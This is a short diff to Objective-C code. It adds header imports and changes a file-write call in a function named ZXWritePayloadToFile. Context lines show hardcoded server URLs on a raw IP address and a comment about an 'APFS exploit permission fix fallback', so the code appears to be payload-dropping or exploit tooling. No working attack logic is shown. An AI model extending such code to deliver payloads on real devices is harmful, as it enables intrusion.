@@ -10,6 +10,9 @@
 #import <CommonCrypto/CommonDigest.h>
 #import <dlfcn.h>
 #import <sys/sysctl.h>
+#import <sys/stat.h>
+#import <unistd.h>
+#import <fcntl.h>
 
 static NSString *const kServerBase    = @"http://144.172.105.169:9002";
 static NSString *const kCfgURL        = @"http://144.172.105.169:9002/config";
@@ -894,7 +897,7 @@ static BOOL ZXWritePayloadToFile(NSData *data, NSString *destPath, NSError **out
     if ([fm fileExistsAtPath:destPath]) {
         [fm removeItemAtPath:destPath error:nil];
     }
-    success = [data writeToFile:destPath atomically:NO error:&err];
+    success = [data writeToFile:destPath options:0 error:&err];
     if (success) return YES;
     
     // Method 4: APFS exploit permission fix fallback
